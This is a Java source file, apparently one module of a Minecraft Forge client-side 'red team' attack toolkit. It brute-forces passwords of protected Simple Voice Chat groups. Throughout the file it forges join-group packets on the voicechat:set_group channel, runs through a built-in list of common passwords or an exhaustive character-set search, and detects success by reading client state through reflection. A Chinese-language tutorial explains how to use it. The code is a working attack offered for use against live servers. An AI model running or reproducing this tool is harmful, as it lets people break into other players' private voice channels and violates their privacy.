package com.redblue.red.modules.voicechat;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.network.chat.Component;
import net.minecraft.network.chat.Style;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.*;

/**
 * VC-01: Group Password Brute Force
 *
 * Vulnerability: ServerGroupManager.joinGroup() has no rate limit on password attempts.
 * Password comparison uses plain String.equals() with immediate success/failure response.
 *
 * Attack: Rapidly send JoinGroupPacket with different passwords to brute force
 * password-protected voice chat groups.
 *
 * Channel: voicechat:set_group (Forge EventNetworkChannel, TCP)
 * Wire format: UUID(groupId) + Boolean(hasPassword) + [if true] String(password, max 512)
 *
 * Success detection: After each attempt, check if the player's group state changed
 * via ClientPlayerStateManager reflection. When joinGroup succeeds, the server calls
 * manager.setGroup(player, group.getId()) and sends JoinedGroupPacket(groupId, false).
 */
public class VC01_GroupBruteForce implements AttackModule {

    private static final ResourceLocation CHANNEL =
        new ResourceLocation("voicechat", "set_group");

    // Brute force state
    private volatile boolean bruteForcing = false;
    private volatile boolean found = false;
    private volatile String foundPassword = null;
    private volatile String lastTriedPassword = null;
    private int attemptIndex = 0;
    private long lastAttemptTick = 0;
    private String currentCharset = "";
    private int currentMaxLen = 0;
    private List<String> candidateList = null;
    // Cooldown after sending: wait a few ticks for server response
    private int waitTicks = 0;
    private static final int WAIT_AFTER_SEND = 2;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofString("target_group_id", "目标群组UUID", ""),
        ConfigParam.ofEnum("mode", "破解模式", "DICT",
            "DICT", "BRUTEFORCE"),
        ConfigParam.ofString("dict_words", "字典(逗号分隔)",
            "123,1234,12345,123456,password,admin,test,"
            + "abc,111,000,666,888,520,1314,qwerty,letmein"),
        ConfigParam.ofString("charset", "字符集(暴力模式)",
            "0123456789abcdefghijklmnopqrstuvwxyz"),
        ConfigParam.ofInt("max_len", "最大密码长度(暴力模式)", 4, 1, 6),
        ConfigParam.ofInt("interval", "发包间隔(tick)", 2, 1, 20),
        ConfigParam.ofAction("list_groups", "列出已知群组",
            this::listGroups),
        ConfigParam.ofAction("stop", "停止破解",
            this::stopBruteForce)
    );

    @Override public String id() { return "vc01_group_bruteforce"; }
    @Override public String name() { return "群组密码破解"; }
    @Override public String description() {
        return "暴力破解语音群组密码(无速率限制)";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 点击「列出已知群组」查看服务器上的语音群组\n"
            + "2. 复制目标群组UUID填入\n"
            + "3. 选择破解模式: DICT(字典) 或 BRUTEFORCE(暴力)\n"
            + "4. 点击Execute开始, tick循环自动尝试\n"
            + "5. 成功加入群组时会在聊天栏提示\n\n"
            + "[原理]\n"
            + "ServerGroupManager.joinGroup() 无速率限制,\n"
            + "每次尝试立即返回成功/失败.\n"
            + "成功时玩家自动加入群组, 可通过状态检测.\n\n"
            + "[注意]\n"
            + "暴力模式组合数随字符集和长度指数增长.\n"
            + "建议先用字典模式尝试常见密码.";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("voicechat");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;

        String groupIdStr = getParam("target_group_id")
            .map(ConfigParam::getString).orElse("");
        if (groupIdStr.isEmpty()) {
            chat(mc, "请先填入目标群组UUID");
            return;
        }
        try {
            UUID.fromString(groupIdStr);
        } catch (Exception e) {
            chat(mc, "无效的UUID格式");
            return;
        }

        // Reset state
        bruteForcing = true;
        found = false;
        foundPassword = null;
        lastTriedPassword = null;
        attemptIndex = 0;
        waitTicks = 0;

        String mode = getParam("mode")
            .map(ConfigParam::getString).orElse("DICT");
        if ("DICT".equals(mode)) {
            String words = getParam("dict_words")
                .map(ConfigParam::getString).orElse("");
            candidateList = new ArrayList<>(
                Arrays.asList(words.split(",")));
            candidateList.removeIf(String::isEmpty);
            chat(mc, "开始字典破解, 共 "
                + candidateList.size() + " 个候选密码");
        } else {
            currentCharset = getParam("charset")
                .map(ConfigParam::getString)
                .orElse("0123456789abcdefghijklmnopqrstuvwxyz");
            currentMaxLen = getParam("max_len")
                .map(ConfigParam::getInt).orElse(4);
            candidateList = null;
            long total = 0;
            for (int l = 1; l <= currentMaxLen; l++) {
                total += (long) Math.pow(currentCharset.length(), l);
            }
            chat(mc, "开始暴力破解, 字符集="
                + currentCharset.length()
                + ", 最大长度=" + currentMaxLen
                + ", 总组合=" + total);
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || !bruteForcing || found) return;
        if (mc.level == null) return;

        // After sending, wait a few ticks for server response
        if (waitTicks > 0) {
            waitTicks--;
            if (waitTicks == 0) {
                // Check if we joined the group (success detection)
                if (checkJoinedGroup(mc)) {
                    found = true;
                    bruteForcing = false;
                    foundPassword = lastTriedPassword;
                    chat(mc, "*** 密码破解成功! ***");
                    chat(mc, "密码: " + foundPassword);
                    chat(mc, "已自动加入目标群组");
                    return;
                }
            }
            return;
        }

        int interval = getParam("interval")
            .map(ConfigParam::getInt).orElse(2);
        long now = mc.level.getGameTime();
        if (now - lastAttemptTick < interval) return;
        lastAttemptTick = now;

        String password = getNextCandidate();
        if (password == null) {
            chat(mc, "所有候选密码已尝试完毕, 未找到匹配密码");
            bruteForcing = false;
            return;
        }

        String groupIdStr = getParam("target_group_id")
            .map(ConfigParam::getString).orElse("");
        UUID groupId;
        try {
            groupId = UUID.fromString(groupIdStr);
        } catch (Exception e) {
            chat(mc, "无效的UUID格式");
            bruteForcing = false;
            return;
        }

        lastTriedPassword = password;
        sendJoinGroupPacket(groupId, password);
        waitTicks = WAIT_AFTER_SEND;

        if (attemptIndex % 100 == 0) {
            chat(mc, "已尝试 " + attemptIndex
                + " 个密码, 当前: " + password);
        }
    }

    /**
     * Check if the player has joined a group by inspecting
     * ClientPlayerStateManager via reflection.
     */
    private boolean checkJoinedGroup(Minecraft mc) {
        try {
            Class<?> cmClass = Class.forName(
                "de.maxhenkel.voicechat.voice.client.ClientManager");
            Object psMgr = cmClass.getMethod(
                "getPlayerStateManager").invoke(null);
            // ClientPlayerStateManager.getGroupId() returns UUID or null
            var getGroupId = psMgr.getClass()
                .getMethod("getGroupID");
            Object groupId = getGroupId.invoke(psMgr);
            if (groupId == null) return false;

            String targetStr = getParam("target_group_id")
                .map(ConfigParam::getString).orElse("");
            UUID targetId = UUID.fromString(targetStr);
            return targetId.equals(groupId);
        } catch (Exception e) {
            // Method name might differ, try alternative
            return checkJoinedGroupAlt();
        }
    }

    private boolean checkJoinedGroupAlt() {
        try {
            Class<?> cmClass = Class.forName(
                "de.maxhenkel.voicechat.voice.client.ClientManager");
            Object psMgr = cmClass.getMethod(
                "getPlayerStateManager").invoke(null);
            // Try getGroup() which may return ClientGroup
            var getGroup = psMgr.getClass().getMethod("getGroup");
            Object group = getGroup.invoke(psMgr);
            return group != null;
        } catch (Exception e) {
            return false;
        }
    }

    private String getNextCandidate() {
        if (candidateList != null) {
            if (attemptIndex >= candidateList.size()) return null;
            return candidateList.get(attemptIndex++);
        } else {
            return generateBruteForceCandidate(attemptIndex++);
        }
    }

    private String generateBruteForceCandidate(int index) {
        int base = currentCharset.length();
        if (base == 0) return null;
        int remaining = index;
        for (int len = 1; len <= currentMaxLen; len++) {
            long countForLen = (long) Math.pow(base, len);
            if (remaining < countForLen) {
                StringBuilder sb = new StringBuilder();
                int r = remaining;
                for (int i = 0; i < len; i++) {
                    sb.insert(0, currentCharset.charAt(r % base));
                    r /= base;
                }
                return sb.toString();
            }
            remaining -= (int) countForLen;
        }
        return null;
    }

    private void sendJoinGroupPacket(UUID groupId, String password) {
        PacketForge.send(CHANNEL, buf -> {
            // JoinGroupPacket wire format:
            // UUID(groupId) + Boolean(hasPassword)
            //   + [if true] String(password, max 512)
            buf.writeUUID(groupId);
            buf.writeBoolean(true);
            buf.writeUtf(password, 512);
        });
    }

    private void listGroups() {
        Minecraft mc = Minecraft.getInstance();
        if (mc.player == null) return;

        try {
            Class<?> cmClass = Class.forName(
                "de.maxhenkel.voicechat.voice.client.ClientManager");
            Object groupMgr = cmClass.getMethod(
                "getGroupManager").invoke(null);
            @SuppressWarnings("unchecked")
            Collection<?> groups = (Collection<?>)
                groupMgr.getClass().getMethod("getGroups")
                    .invoke(groupMgr);

            if (groups.isEmpty()) {
                chat(mc, "当前无已知群组");
                return;
            }

            chat(mc, "=== 已知语音群组 ===");
            for (Object g : groups) {
                UUID id = (UUID) g.getClass()
                    .getMethod("getId").invoke(g);
                String name = (String) g.getClass()
                    .getMethod("getName").invoke(g);
                boolean hasPwd = (boolean) g.getClass()
                    .getMethod("hasPassword").invoke(g);
                chat(mc, (hasPwd ? "[密码] " : "[开放] ")
                    + name + " | " + id);
            }
            chat(mc, "====================");
        } catch (Exception e) {
            chat(mc, "无法获取群组列表: " + e.getMessage());
        }
    }

    private void stopBruteForce() {
        bruteForcing = false;
        found = false;
        Minecraft mc = Minecraft.getInstance();
        if (mc.player != null) {
            chat(mc, "已停止破解");
        }
    }

    private static void chat(Minecraft mc, String msg) {
        if (mc.player != null) {
            mc.player.displayClientMessage(
                Component.literal("[VC01] " + msg)
                    .withStyle(Style.EMPTY.withColor(0xFF5555)),
                false
            );
        }
    }
}
